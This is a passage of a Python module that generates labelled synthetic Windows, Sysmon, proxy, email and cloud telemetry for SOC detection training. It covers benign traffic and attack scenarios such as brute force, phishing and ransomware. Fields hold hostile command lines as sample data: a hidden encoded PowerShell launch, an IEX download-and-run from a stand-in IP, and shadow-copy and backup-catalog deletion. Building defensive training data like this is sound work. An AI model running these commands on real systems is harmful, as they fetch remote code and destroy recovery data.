"""Synthetic telemetry generator.

Why this exists
---------------
A Tier-1 SOC analyst is judged on how fast and how accurately they turn raw
telemetry into a decision.  You cannot practise that on theory, and you cannot
practise it on a real corporate network either.  So this module generates a
*labelled* corpus: realistic Windows Security / Sysmon / Linux auth / email /
proxy / cloud-audit telemetry, where every attack event is tagged with
``ground_truth=True``.

That label is what turns the project from a toy into something measurable: the
evaluation harness (``soclab/eval.py``) scores our detection rules against the
known truth, so we can honestly quote a recall figure in an interview instead of
"it detected some things".

Everything is deterministic: the same ``seed`` always produces the same corpus,
which means screenshots, demo videos and test results are reproducible.

The IPs use RFC 5737 documentation ranges (TEST-NET-1/2/3) so that nothing in
here can ever be mistaken for, or accidentally point at, a real host.
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone
from typing import Any, Iterable

from . import schema as S
from .events import Event

# --- Lab constants ----------------------------------------------------------
LAB_START = datetime(2026, 10, 5, 9, 0, 0, tzinfo=timezone.utc)
LAB_END = datetime(2026, 10, 12, 18, 0, 0, tzinfo=timezone.utc)

# RFC 5737 documentation ranges (never routable, never real)
EXTERNAL_BAD_IP = "198.51.100.24"
EXTERNAL_C2_IP = "203.0.113.77"
EXTERNAL_EXFIL_IP = "192.0.2.45"
BENIGN_EXT_IP = "192.0.2.10"

INTERNAL_SUBNET = "10.10."

# Assets used across the lab.  `config/assets.yaml` carries the authoritative
# criticality; the names here are what the generator emits.
HOSTS = {
    "DC01": {"ip": "10.10.0.5", "os": "Windows Server 2022", "role": "Domain Controller", "criticality": "critical"},
    "WKS-FIN-014": {"ip": "10.10.4.14", "os": "Windows 11 Enterprise", "role": "Finance Workstation", "criticality": "critical"},
    "WKS-HR-003": {"ip": "10.10.2.3", "os": "Windows 10 Enterprise", "role": "HR Workstation", "criticality": "medium"},
    "WKS-ENG-021": {"ip": "10.10.3.21", "os": "Windows 11 Enterprise", "role": "Engineering Workstation", "criticality": "medium"},
    "SRV-FS-002": {"ip": "10.10.1.2", "os": "Windows Server 2019", "role": "File Server", "criticality": "high"},
    "SRV-SQL-007": {"ip": "10.10.1.7", "os": "Windows Server 2019", "role": "SQL Server", "criticality": "critical"},
    "WEB-PUBLIC-01": {"ip": "10.10.9.1", "os": "Ubuntu 22.04 LTS", "role": "Public Web Server", "criticality": "high"},
    "LINUX-BUILD-01": {"ip": "10.10.5.40", "os": "Ubuntu 22.04 LTS", "role": "Build Server", "criticality": "medium"},
}

USERS = {
    "a.ramesh": {"domain": "ACME", "role": "Finance analyst", "dept": "Finance"},
    "s.iyer": {"domain": "ACME", "role": "HR executive", "dept": "HR"},
    "m.kulkarni": {"domain": "ACME", "role": "DevOps engineer", "dept": "Engineering"},
    "svc_backup": {"domain": "ACME", "role": "Service account", "dept": "IT"},
    "administrator": {"domain": "ACME", "role": "Domain admin", "dept": "IT"},
    "j.venkatesh": {"domain": "ACME", "role": "Network engineer", "dept": "IT"},
}

BENIGN_URLS = [
    "https://www.google.com/",
    "https://github.com/",
    "https://stackoverflow.com/questions/",
    "https://en.wikipedia.org/wiki/",
    "https://mail.google.com/mail/u/0/",
    "https://docs.python.org/3/",
]
BENIGN_SUBJECTS = [
    "Re: Q3 payroll review notes",
    "Invoice #INV-2026-0912",
    "Design review agenda - Thursday",
    "Reminder: complete security awareness quiz",
    "Team offsite logistics",
    "Build pipeline #4821 succeeded",
]


class LogGenerator:
    """Deterministic generator for the lab corpus."""

    def __init__(self, seed: int = 1337) -> None:
        self.rng = random.Random(seed)
        self.now = LAB_START
        self._events: list[Event] = []

    # -- helpers ----------------------------------------------------------
    def _ts(self) -> datetime:
        return self.now

    def _emit(
        self,
        source: str,
        fields: dict[str, Any],
        *,
        ground_truth: bool = False,
        scenario: str = "",
        labels: dict[str, str] | None = None,
        advance: tuple[int, int] = (0, 0),
    ) -> Event:
        evt = Event(
            timestamp=self.now,
            source=source,
            fields=fields,
            ground_truth=ground_truth,
            scenario=scenario,
            labels=labels or {},
        )
        self._events.append(evt)
        if advance != (0, 0):
            self.now += timedelta(minutes=advance[0], seconds=advance[1])
        return evt

    def _host_fields(self, host: str) -> dict[str, Any]:
        h = HOSTS[host]
        return {S.HOST_NAME: host, S.HOST_IP: h["ip"], S.HOST_OS: h["os"]}

    def _user_fields(self, user: str) -> dict[str, Any]:
        u = USERS[user]
        return {S.USER_NAME: user, S.USER_DOMAIN: u["domain"], "user.role": u["role"], "user.department": u["dept"]}

    def _rand_internal_ip(self) -> str:
        return f"{INTERNAL_SUBNET}{self.rng.randint(1, 40)}.{self.rng.randint(2, 250)}"

    # =====================================================================
    # Benign background traffic
    # =====================================================================
    def benign_background(self, count: int = 220) -> list[Event]:
        """Realistic day-in-the-life traffic so alerts are not all true."""
        out: list[Event] = []
        for _ in range(count):
            host = self.rng.choice(list(HOSTS)[:6])
            user = self.rng.choice(list(USERS))
            kind = self.rng.choices(
                ["logon", "process", "web", "email", "cloud", "syslog"],
                weights=[30, 25, 20, 12, 8, 5],
            )[0]

            if kind == "logon":
                f = {
                    **self._host_fields(host),
                    **self._user_fields(user),
                    S.EVENT_CATEGORY: S.CAT_AUTH,
                    S.EVENT_TYPE: "start",
                    S.EVENT_ACTION: "logon_success",
                    S.EVENT_CODE: "4624",
                    S.EVENT_ID: "4624",
                    S.EVENT_OUTCOME: "success",
                    S.AUTH_TYPE: self.rng.choice([2, 2, 3, 10]),
                    S.AUTH_PACKAGE: "Kerberos",
                    S.SRC_IP: self._rand_internal_ip(),
                    S.MESSAGE: f"Successful interactive logon for {user}",
                }
                out.append(self._emit(S.SRC_WINDOWS, f, advance=(self.rng.randint(0, 6), 0)))

            elif kind == "process":
                proc = self.rng.choice(
                    ["chrome.exe", "OUTLOOK.EXE", "code.exe", "explorer.exe", "Teams.exe", "notepad.exe"]
                )
                f = {
                    **self._host_fields(host),
                    **self._user_fields(user),
                    S.EVENT_CATEGORY: S.CAT_PROCESS,
                    S.EVENT_TYPE: "start",
                    S.EVENT_ACTION: "process_started",
                    S.EVENT_CODE: "1",
                    S.EVENT_ID: "1",
                    S.EVENT_OUTCOME: "success",
                    S.PROCESS_NAME: proc,
                    S.PROCESS_PATH: f"C:\\Program Files\\{proc}",
                    S.PROCESS_CMD: f"\"{proc}\" --background",
                    S.PROCESS_PARENT: "explorer.exe",
                    S.MESSAGE: f"Process {proc} created",
                }
                out.append(self._emit(S.SRC_SYSMON, f, advance=(0, self.rng.randint(5, 90))))

            elif kind == "web":
                url = self.rng.choice(BENIGN_URLS)
                f = {
                    **self._host_fields(host),
                    **self._user_fields(user),
                    S.EVENT_CATEGORY: S.CAT_PROXY,
                    S.EVENT_TYPE: "access",
                    S.EVENT_CODE: "proxy_allow",
                    S.EVENT_OUTCOME: "success",
                    S.PROXY_URL: url,
                    S.URL: url,
                    S.PROXY_VERB: "GET",
                    S.PROXY_BYTES: self.rng.randint(900, 900_000),
                    S.HTTP_STATUS: 200,
                    S.DST_IP: BENIGN_EXT_IP,
                    S.MESSAGE: f"Allowed web request to {url}",
                }
                out.append(self._emit(S.SRC_PROXY, f, advance=(0, self.rng.randint(3, 45))))

            elif kind == "email":
                f = {
                    **self._host_fields("SRV-FS-002"),
                    **self._user_fields(user),
                    S.EVENT_CATEGORY: S.CAT_EMAIL,
                    S.EVENT_TYPE: "access",
                    S.EVENT_CODE: "mail_delivered",
                    S.EVENT_OUTCOME: "success",
                    S.MAIL_FROM: f"{user}@acme-corp.in",
                    S.MAIL_TO: "partner@supplier.example.com",
                    S.MAIL_SUBJECT: self.rng.choice(BENIGN_SUBJECTS),
                    S.MAIL_ATTACH_COUNT: self.rng.choice([0, 0, 1]),
                    S.MAIL_ATTACH: "report.xlsx" if self.rng.random() < 0.3 else "",
                    S.MAIL_ATTACH_SIZE: self.rng.randint(40_000, 900_000),
                    S.SPF_RESULT: "pass",
                    S.DKIM_RESULT: "pass",
                    S.DMARC_RESULT: "pass",
                    S.MESSAGE: "Message delivered to inbox",
                }
                out.append(self._emit(S.SRC_EMAIL, f, advance=(0, self.rng.randint(10, 120))))

            elif kind == "cloud":
                f = {
                    **self._host_fields(host),
                    **self._user_fields(user),
                    S.EVENT_CATEGORY: S.CAT_CLOUD,
                    S.EVENT_TYPE: "access",
                    S.EVENT_CODE: "cloud_api",
                    S.EVENT_OUTCOME: "success",
                    S.CLOUD_PROVIDER: "aws",
                    S.CLOUD_ACCOUNT: "444455556666",
                    S.CLOUD_REGION: "ap-south-1",
                    S.CLOUD_ACTION: self.rng.choice(["DescribeInstances", "GetObject", "ListBuckets", "PutObject"]),
                    S.CLOUD_RESOURCE: f"arn:aws:s3:::acme-logs/{self.rng.randint(1, 99)}.log",
                    S.API_CALL: self.rng.choice(["DescribeInstances", "GetObject", "ListBuckets"]),
                    S.CLOUD_SOURCE_IP: self._rand_internal_ip(),
                    S.MESSAGE: "Cloud API call succeeded",
                }
                out.append(self._emit(S.SRC_CLOUD, f, advance=(0, self.rng.randint(4, 60))))

            else:  # linux syslog
                f = {
                    **self._host_fields("WEB-PUBLIC-01"),
                    S.EVENT_CATEGORY: S.CAT_AUTH,
                    S.EVENT_TYPE: "start",
                    S.EVENT_CODE: "sshd",
                    S.EVENT_OUTCOME: "success",
                    S.USER_NAME: "deploy",
                    S.SRC_IP: self._rand_internal_ip(),
                    S.MESSAGE: "Accepted publickey for deploy from 10.10.3.21 port 51234 ssh2",
                }
                out.append(self._emit(S.SRC_SYSLOG, f, advance=(0, self.rng.randint(20, 200))))
        return out

    def benign_mistyped_password(self, count: int = 3) -> list[Event]:
        """Users typing the wrong password a few times.

        This is the single most common false positive in a SOC.  It produces
        the same "failures then success" pattern as a real credential attack,
        which is exactly why the rule is noisy and why a real SOC needs an
        allow-list of shared egress addresses (see config/org.yaml).
        """
        out: list[Event] = []
        for _ in range(count):
            user = self.rng.choice([u for u in USERS if not u.startswith("svc_")])
            host = self.rng.choice(["WKS-HR-003", "WKS-ENG-021", "WKS-FIN-014"])
            for _attempt in range(3):
                f = {
                    **self._host_fields(host),
                    **self._user_fields(user),
                    S.EVENT_CATEGORY: S.CAT_AUTH,
                    S.EVENT_TYPE: "start",
                    S.EVENT_ACTION: "logon_failure",
                    S.EVENT_CODE: "4625",
                    S.EVENT_ID: "4625",
                    S.EVENT_OUTCOME: "failure",
                    S.AUTH_TYPE: 2,
                    S.AUTH_PACKAGE: "Kerberos",
                    S.SRC_IP: "10.10.99.5",  # shared corporate VPN egress
                    S.DST_IP: HOSTS[host]["ip"],
                    S.MESSAGE: f"An account failed to log on. Account: {user}",
                }
                out.append(self._emit(S.SRC_WINDOWS, f, advance=(0, 25)))
            f = {
                **self._host_fields(host),
                **self._user_fields(user),
                S.EVENT_CATEGORY: S.CAT_AUTH,
                S.EVENT_TYPE: "start",
                S.EVENT_ACTION: "logon_success",
                S.EVENT_CODE: "4624",
                S.EVENT_ID: "4624",
                S.EVENT_OUTCOME: "success",
                S.AUTH_TYPE: 2,
                S.AUTH_PACKAGE: "Kerberos",
                S.SRC_IP: "10.10.99.5",
                S.DST_IP: HOSTS[host]["ip"],
                S.MESSAGE: f"An account was successfully logged on. Account: {user}",
            }
            out.append(self._emit(S.SRC_WINDOWS, f, advance=(2, 0)))
        return out

    # =====================================================================
    # Scenario 1 - credential brute force
    # =====================================================================
    def scenario_brute_force(self) -> list[Event]:
        """T1110.001 - password spraying then a successful logon."""
        out: list[Event] = []
        self.now = LAB_START + timedelta(hours=3, minutes=12)
        target_user = "a.ramesh"
        # Password spray: one attempt per account from the same source.
        for user in USERS:
            f = {
                **self._host_fields("DC01"),
                **self._user_fields(user),
                S.EVENT_CATEGORY: S.CAT_AUTH,
                S.EVENT_TYPE: "start",
                S.EVENT_ACTION: "logon_failure",
                S.EVENT_CODE: "4625",
                S.EVENT_ID: "4625",
                S.EVENT_OUTCOME: "failure",
                S.AUTH_TYPE: 3,
                S.AUTH_PACKAGE: "NTLM",
                S.SRC_IP: EXTERNAL_BAD_IP,
                S.DST_IP: HOSTS["DC01"]["ip"],
                S.MESSAGE: f"An account failed to log on. Account: {user}",
            }
            out.append(self._emit(S.SRC_WINDOWS, f, ground_truth=True, scenario="brute_force",
                                  labels={"stage": "password_spray"}, advance=(0, 3)))

        # Then focused brute force against one account from the same IP.
        for _ in range(14):
            f = {
                **self._host_fields("DC01"),
                **self._user_fields(target_user),
                S.EVENT_CATEGORY: S.CAT_AUTH,
                S.EVENT_TYPE: "start",
                S.EVENT_ACTION: "logon_failure",
                S.EVENT_CODE: "4625",
                S.EVENT_ID: "4625",
                S.EVENT_OUTCOME: "failure",
                S.AUTH_TYPE: 3,
                S.AUTH_PACKAGE: "NTLM",
                S.SRC_IP: EXTERNAL_BAD_IP,
                S.DST_IP: HOSTS["DC01"]["ip"],
                S.MESSAGE: f"An account failed to log on. Account: {target_user}",
            }
            out.append(self._emit(S.SRC_WINDOWS, f, ground_truth=True, scenario="brute_force",
                                  labels={"stage": "brute_force"}, advance=(0, 12)))

        # Success right after - the classic "alert would have prevented this" story.
        f = {
            **self._host_fields("DC01"),
            **self._user_fields(target_user),
            S.EVENT_CATEGORY: S.CAT_AUTH,
            S.EVENT_TYPE: "start",
            S.EVENT_ACTION: "logon_success",
            S.EVENT_CODE: "4624",
            S.EVENT_ID: "4624",
            S.EVENT_OUTCOME: "success",
            S.AUTH_TYPE: 3,
            S.AUTH_PACKAGE: "NTLM",
            S.SRC_IP: EXTERNAL_BAD_IP,
            S.DST_IP: HOSTS["DC01"]["ip"],
            S.MESSAGE: f"An account was successfully logged on. Account: {target_user}",
        }
        out.append(self._emit(S.SRC_WINDOWS, f, ground_truth=True, scenario="brute_force",
                              labels={"stage": "successful_logon"}))

        # The same attacker also hits the public Linux host over SSH.
        self.now = LAB_START + timedelta(hours=4, minutes=5)
        for _ in range(11):
            f = {
                **self._host_fields("WEB-PUBLIC-01"),
                S.EVENT_CATEGORY: S.CAT_AUTH,
                S.EVENT_TYPE: "start",
                S.EVENT_CODE: "sshd_fail",
                S.EVENT_ID: "sshd_fail",
                S.EVENT_OUTCOME: "failure",
                S.USER_NAME: "root",
                S.SRC_IP: EXTERNAL_BAD_IP,
                S.DST_IP: HOSTS["WEB-PUBLIC-01"]["ip"],
                S.MESSAGE: "Failed password for root from 198.51.100.24 port 44122 ssh2",
            }
            out.append(self._emit(S.SRC_SYSLOG, f, ground_truth=True, scenario="brute_force",
                                  labels={"stage": "linux_brute_force"}, advance=(0, 9)))
        return out

    # =====================================================================
    # Scenario 2 - phishing -> credential theft
    # =====================================================================
    def scenario_phishing(self) -> list[Event]:
        """T1566.001 / T1056.003 - phishing mail, link click, credential entry."""
        out: list[Event] = []
        self.now = LAB_START + timedelta(days=1, hours=2, minutes=5)
        phish_url = "http://acme-portal-verify[.]com/session/reset?token=zz9"
        f = {
            **self._host_fields("SRV-FS-002"),
            S.EVENT_CATEGORY: S.CAT_EMAIL,
            S.EVENT_TYPE: "creation",
            S.EVENT_CODE: "mail_delivered",
            S.EVENT_OUTCOME: "success",
            S.MAIL_FROM: "IT-Support@acme-portal-verify[.]com",
            S.MAIL_REPLY_TO: "helpdesk@acme-portal-verify[.]com",
            S.MAIL_TO: "s.iyer@acme-corp.in",
            S.MAIL_SUBJECT: "URGENT: Your mailbox will be suspended in 2 hours",
            S.MAIL_ATTACH_COUNT: 1,
            S.MAIL_ATTACH: "Invoice_2026.zip",
            S.MAIL_ATTACH_SIZE: 88_400,
            S.SPF_RESULT: "fail",
            S.DKIM_RESULT: "fail",
            S.DMARC_RESULT: "fail",
            S.MAIL_RULE: "suspicious_attachment_zip",
            S.MESSAGE: "Message delivered to inbox (spam score 8/10)",
        }
        out.append(self._emit(S.SRC_EMAIL, f, ground_truth=True, scenario="phishing",
                              labels={"stage": "delivery"}))

        # User clicks the link ~40 minutes later.
        self.now += timedelta(minutes=41)
        f = {
            **self._host_fields("WKS-HR-003"),
            **self._user_fields("s.iyer"),
            S.EVENT_CATEGORY: S.CAT_PROXY,
            S.EVENT_TYPE: "access",
            S.EVENT_CODE: "proxy_allow",
            S.EVENT_OUTCOME: "success",
            S.PROXY_URL: phish_url,
            S.URL: phish_url,
            S.PROXY_VERB: "GET",
            S.PROXY_BYTES: 1_842,
            S.HTTP_STATUS: 200,
            S.DST_IP: EXTERNAL_C2_IP,
            S.MESSAGE: "User visited newly-registered domain",
        }
        out.append(self._emit(S.SRC_PROXY, f, ground_truth=True, scenario="phishing",
                              labels={"stage": "click"}))

        # Credentials posted to the attacker's server.
        self.now += timedelta(minutes=3)
        f = {
            **self._host_fields("WKS-HR-003"),
            **self._user_fields("s.iyer"),
            S.EVENT_CATEGORY: S.CAT_NETWORK,
            S.EVENT_TYPE: "connection",
            S.EVENT_CODE: "credsubmit",
            S.EVENT_OUTCOME: "success",
            S.URL: phish_url,
            S.DST_IP: EXTERNAL_C2_IP,
            S.DST_PORT: 443,
            S.PROXY_BYTES: 512,
            S.MESSAGE: "POST /session/reset with form field 'password'",
        }
        out.append(self._emit(S.SRC_PROXY, f, ground_truth=True, scenario="phishing",
                              labels={"stage": "credential_entry"}))

        # Defender flags the downloaded script.
        self.now += timedelta(minutes=1)
        f = {
            **self._host_fields("WKS-HR-003"),
            **self._user_fields("s.iyer"),
            S.EVENT_CATEGORY: S.CAT_FILE,
            S.EVENT_TYPE: "creation",
            S.EVENT_CODE: "file_download",
            S.EVENT_OUTCOME: "success",
            S.FILE_PATH: "C:\\Users\\s.iyer\\Downloads\\Invoice_2026.zip",
            S.FILE_NAME: "Invoice_2026.zip",
            S.URL: phish_url,
            S.MESSAGE: "Archive downloaded to disk",
        }
        out.append(self._emit(S.SRC_EDR, f, ground_truth=True, scenario="phishing",
                              labels={"stage": "payload_staged"}))
        return out

    # =====================================================================
    # Scenario 3 - PowerShell obfuscation + defence evasion
    # =====================================================================
    def scenario_powershell_evasion(self) -> list[Event]:
        """T1059.001 + T1562.001 - encoded PowerShell, Defender disabled."""
        out: list[Event] = []
        self.now = LAB_START + timedelta(days=2, hours=4, minutes=30)
        encoded = "JABjAG8AbgA0AG0AbgA="  # truncated base64 blob
        f = {
            **self._host_fields("WKS-FIN-014"),
            **self._user_fields("a.ramesh"),
            S.EVENT_CATEGORY: S.CAT_PROCESS,
            S.EVENT_TYPE: "start",
            S.EVENT_ACTION: "process_started",
            S.EVENT_CODE: "1",
            S.EVENT_ID: "1",
            S.EVENT_OUTCOME: "success",
            S.PROCESS_NAME: "powershell.exe",
            S.PROCESS_PATH: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            S.PROCESS_CMD: "powershell.exe -nop -w hidden -enc " + encoded,
            S.PROCESS_PARENT: "winword.exe",
            S.MESSAGE: "Process powershell.exe created with command line",
        }
        out.append(self._emit(S.SRC_SYSMON, f, ground_truth=True, scenario="powershell_evasion",
                              labels={"stage": "execution"}))

        # Script block logging (4104) - the content a real analyst would decode.
        self.now += timedelta(seconds=4)
        f = {
            **self._host_fields("WKS-FIN-014"),
            **self._user_fields("a.ramesh"),
            S.EVENT_CATEGORY: S.CAT_PROCESS,
            S.EVENT_TYPE: "start",
            S.EVENT_CODE: "4104",
            S.EVENT_ID: "4104",
            S.EVENT_OUTCOME: "success",
            S.MESSAGE: "Script Block Logging - IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.24/a.ps1')",
            "powershell.script_block": "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.24/a.ps1')",
        }
        out.append(self._emit(S.SRC_WINDOWS, f, ground_truth=True, scenario="powershell_evasion",
                              labels={"stage": "script_block"}))

        # Defender configuration changed (tamper) - 5007.
        self.now += timedelta(minutes=1)
        f = {
            **self._host_fields("WKS-FIN-014"),
            S.EVENT_CATEGORY: S.CAT_CONFIG,
            S.EVENT_TYPE: "change",
            S.EVENT_CODE: "5007",
            S.EVENT_ID: "5007",
            S.EVENT_OUTCOME: "success",
            S.MESSAGE: "Antivirus configuration changed: Real-Time Protection disabled",
            "av.setting": "DisableRealtimeMonitoring",
            "av.value": "1",
        }
        out.append(self._emit(S.SRC_WINDOWS, f, ground_truth=True, scenario="powershell_evasion",
                              labels={"stage": "defence_evasion"}))

        # Windows Firewall rule added to allow inbound - 4948-ish via 2004/2005.
        self.now += timedelta(seconds=45)
        f = {
            **self._host_fields("WKS-FIN-014"),
            **self._user_fields("a.ramesh"),
            S.EVENT_CATEGORY: S.CAT_CONFIG,
            S.EVENT_TYPE: "change",
            S.EVENT_CODE: "4948",
            S.EVENT_ID: "4948",
            S.EVENT_OUTCOME: "success",
            S.MESSAGE: "A new inbound firewall rule was added allowing TCP 4444 from any IP",
            "firewall.rule": "Allow-Inbound-4444",
        }
        out.append(self._emit(S.SRC_WINDOWS, f, ground_truth=True, scenario="powershell_evasion",
                              labels={"stage": "persistence"}))
        return out

    # =====================================================================
    # Scenario 4 - lateral movement + privilege escalation
    # =====================================================================
    def scenario_lateral_movement(self) -> list[Event]:
        """T1021.002 + T1078 - SMB share access, service install, new admin."""
        out: list[Event] = []
        self.now = LAB_START + timedelta(days=3, hours=1, minutes=15)
        f = {
            **self._host_fields("SRV-FS-002"),
            **self._user_fields("s.iyer"),
            S.EVENT_CATEGORY: S.CAT_AUTH,
            S.EVENT_TYPE: "start",
            S.EVENT_ACTION: "logon_success",
            S.EVENT_CODE: "4624",
            S.EVENT_ID: "4624",
            S.EVENT_OUTCOME: "success",
            S.AUTH_TYPE: 3,
            S.AUTH_PACKAGE: "Kerberos",
            S.SRC_IP: HOSTS["WKS-HR-003"]["ip"],
            S.DST_IP: HOSTS["SRV-FS-002"]["ip"],
            S.MESSAGE: "Account s.iyer logged on to SRV-FS-002 over the network (type 3)",
        }
        out.append(self._emit(S.SRC_WINDOWS, f, ground_truth=True, scenario="lateral_movement",
                              labels={"stage": "remote_logon"}))

        self.now += timedelta(minutes=2)
        f = {
            **self._host_fields("SRV-FS-002"),
            **self._user_fields("s.iyer"),
            S.EVENT_CATEGORY: S.CAT_FILE,
            S.EVENT_TYPE: "access",
            S.EVENT_CODE: "5140",
            S.EVENT_ID: "5140",
            S.EVENT_OUTCOME: "success",
            S.SRC_IP: HOSTS["WKS-HR-003"]["ip"],
            S.FILE_PATH: "\\\\SRV-FS-002\\Finance$",
            S.MESSAGE: "Network share accessed: \\\\SRV-FS-002\\Finance$",
        }
        out.append(self._emit(S.SRC_WINDOWS, f, ground_truth=True, scenario="lateral_movement",
                              labels={"stage": "share_access"}))

        # Service installed (psexec / malicious service) - 7045.
        self.now += timedelta(minutes=4)
        f = {
            **self._host_fields("SRV-FS-002"),
            **self._user_fields("s.iyer"),
            S.EVENT_CATEGORY: S.CAT_CONFIG,
            S.EVENT_TYPE: "change",
            S.EVENT_CODE: "7045",
            S.EVENT_ID: "7045",
            S.EVENT_OUTCOME: "success",
            S.MESSAGE: "A service was installed: ImagePath = C:\\Windows\\PSEXESVC.exe",
            "service.name": "PSEXESVC",
            "service.image_path": "C:\\Windows\\PSEXESVC.exe",
        }
        out.append(self._emit(S.SRC_WINDOWS, f, ground_truth=True, scenario="lateral_movement",
                              labels={"stage": "remote_service"}))

        # A brand new account added to the Domain Admins group.
        self.now += timedelta(minutes=6)
        f = {
            **self._host_fields("DC01"),
            S.EVENT_CATEGORY: S.CAT_CONFIG,
            S.EVENT_TYPE: "change",
            S.EVENT_CODE: "4720",
            S.EVENT_ID: "4720",
            S.EVENT_OUTCOME: "success",
            S.USER_NAME: "temp_support",
            S.MESSAGE: "User account 'temp_support' was created on DC01",
        }
        out.append(self._emit(S.SRC_WINDOWS, f, ground_truth=True, scenario="lateral_movement",
                              labels={"stage": "new_account"}))

        self.now += timedelta(seconds=20)
        f = {
            **self._host_fields("DC01"),
            S.EVENT_CATEGORY: S.CAT_CONFIG,
            S.EVENT_TYPE: "change",
            S.EVENT_CODE: "4732",
            S.EVENT_ID: "4732",
            S.EVENT_OUTCOME: "success",
            S.USER_NAME: "temp_support",
            S.MESSAGE: "Member added to security-enabled global group 'Domain Admins'",
            "group.name": "Domain Admins",
        }
        out.append(self._emit(S.SRC_WINDOWS, f, ground_truth=True, scenario="lateral_movement",
                              labels={"stage": "priv_esc"}))
        return out

    # =====================================================================
    # Scenario 5 - ransomware staging + exfiltration
    # =====================================================================
    def scenario_ransomware(self) -> list[Event]:
        """T1486 + T1041 - shadow copy deletion, mass rename, large upload."""
        out: list[Event] = []
        self.now = LAB_START + timedelta(days=4, hours=5, minutes=40)
        f = {
            **self._host_fields("SRV-FS-002"),
            **self._user_fields("administrator"),
            S.EVENT_CATEGORY: S.CAT_PROCESS,
            S.EVENT_TYPE: "start",
            S.EVENT_CODE: "1",
            S.EVENT_ID: "1",
            S.EVENT_OUTCOME: "success",
            S.PROCESS_NAME: "vssadmin.exe",
            S.PROCESS_CMD: "vssadmin.exe delete shadows /all /quiet",
            S.PROCESS_PARENT: "cmd.exe",
            S.MESSAGE: "Process vssadmin.exe created",
        }
        out.append(self._emit(S.SRC_SYSMON, f, ground_truth=True, scenario="ransomware",
                              labels={"stage": "recovery_disable"}))

        self.now += timedelta(minutes=2)
        f = {
            **self._host_fields("SRV-FS-002"),
            S.EVENT_CATEGORY: S.CAT_PROCESS,
            S.EVENT_TYPE: "start",
            S.EVENT_CODE: "1",
            S.EVENT_ID: "1",
            S.EVENT_OUTCOME: "success",
            S.PROCESS_NAME: "wbadmin.exe",
            S.PROCESS_CMD: "wbadmin delete catalog -quiet",
            S.PROCESS_PARENT: "cmd.exe",
            S.MESSAGE: "Process wbadmin.exe created",
        }
        out.append(self._emit(S.SRC_SYSMON, f, ground_truth=True, scenario="ransomware",
                              labels={"stage": "recovery_disable"}))

        # Mass file rename - Sysmon 11 file create, .encrypted extension.
        for i in range(12):
            self.now += timedelta(seconds=3)
            f = {
                **self._host_fields("SRV-FS-002"),
                **self._user_fields("administrator"),
                S.EVENT_CATEGORY: S.CAT_FILE,
                S.EVENT_TYPE: "creation",
                S.EVENT_CODE: "11",
                S.EVENT_ID: "11",
                S.EVENT_OUTCOME: "success",
                S.FILE_NAME: f"Q3_SALARY_{i:03d}.xlsx.encrypted",
                S.FILE_PATH: f"D:\\Finance\\Q3_SALARY_{i:03d}.xlsx.encrypted",
                S.PROCESS_NAME: "locker.exe",
                S.MESSAGE: "File created with .encrypted extension",
            }
            out.append(self._emit(S.SRC_SYSMON, f, ground_truth=True, scenario="ransomware",
                                  labels={"stage": "encryption"}))

        # Exfiltration: large upload to a personal cloud drive.
        self.now += timedelta(minutes=6)
        f = {
            **self._host_fields("SRV-FS-002"),
            **self._user_fields("administrator"),
            S.EVENT_CATEGORY: S.CAT_NETWORK,
            S.EVENT_TYPE: "connection",
            S.EVENT_CODE: "net_connect",
            S.EVENT_OUTCOME: "success",
            S.PROCESS_NAME: "locker.exe",
            S.URL: "https://drive.usercontent.google.com/upload/storage",
            S.DST_IP: EXTERNAL_EXFIL_IP,
            S.DST_PORT: 443,
            S.PROXY_BYTES: 2_450_880_000,
            S.PROXY_VERB: "PUT",
            S.MESSAGE: "Large outbound upload (2.3 GB) to consumer cloud storage",
        }
        out.append(self._emit(S.SRC_PROXY, f, ground_truth=True, scenario="ransomware",
                              labels={"stage": "exfiltration"}))
        return out

    # =====================================================================
    # Scenario 6 - cloud misconfiguration
    # =====================================================================
    def scenario_cloud_misconfig(self) -> list[Event]:
        """T1530 / T1552.005 - public bucket, wildcard IAM, MFA disabled."""
        out: list[Event] = []
        self.now = LAB_START + timedelta(days=5, hours=3, minutes=50)
        f = {
            **self._host_fields("LINUX-BUILD-01"),
            **self._user_fields("m.kulkarni"),
            S.EVENT_CATEGORY: S.CAT_CLOUD,
            S.EVENT_TYPE: "change",
            S.EVENT_CODE: "cloud_api",
            S.EVENT_OUTCOME: "success",
            S.CLOUD_PROVIDER: "aws",
            S.CLOUD_ACCOUNT: "444455556666",
            S.CLOUD_REGION: "ap-south-1",
            S.CLOUD_ACTION: "PutBucketAcl",
            S.CLOUD_RESOURCE: "arn:aws:s3:::acme-payroll",
            S.API_CALL: "PutBucketAcl",
            S.CLOUD_SOURCE_IP: HOSTS["LINUX-BUILD-01"]["ip"],
            S.MESSAGE: "S3 bucket acme-payroll ACL set to public-read",
        }
        out.append(self._emit(S.SRC_CLOUD, f, ground_truth=True, scenario="cloud_misconfig",
                              labels={"stage": "public_bucket"}))

        self.now += timedelta(minutes=7)
        f = {
            **self._host_fields("LINUX-BUILD-01"),
            **self._user_fields("m.kulkarni"),
            S.EVENT_CATEGORY: S.CAT_CLOUD,
            S.EVENT_TYPE: "change",
            S.EVENT_CODE: "cloud_api",
            S.EVENT_OUTCOME: "success",
            S.CLOUD_PROVIDER: "aws",
            S.CLOUD_ACCOUNT: "444455556666",
            S.CLOUD_REGION: "ap-south-1",
            S.CLOUD_ACTION: "AttachUserPolicy",
            S.CLOUD_RESOURCE: "arn:aws:iam::444455556666:user/m.kulkarni",
            S.API_CALL: "AttachUserPolicy",
            S.CLOUD_SOURCE_IP: HOSTS["LINUX-BUILD-01"]["ip"],
            S.MESSAGE: "Policy AdministratorAccess attached to user m.kulkarni",
        }
        out.append(self._emit(S.SRC_CLOUD, f, ground_truth=True, scenario="cloud_misconfig",
                              labels={"stage": "privilege_escalation"}))

        self.now += timedelta(minutes=9)
        f = {
            **self._host_fields("DC01"),
            **self._user_fields("administrator"),
            S.EVENT_CATEGORY: S.CAT_CLOUD,
            S.EVENT_TYPE: "change",
            S.EVENT_CODE: "cloud_api",
            S.EVENT_OUTCOME: "success",
            S.CLOUD_PROVIDER: "aws",
            S.CLOUD_ACCOUNT: "444455556666",
            S.CLOUD_REGION: "ap-south-1",
            S.CLOUD_ACTION: "DeactivateMFADevice",
            S.CLOUD_RESOURCE: "arn:aws:iam::444455556666:user/root",
            S.API_CALL: "DeactivateMFADevice",
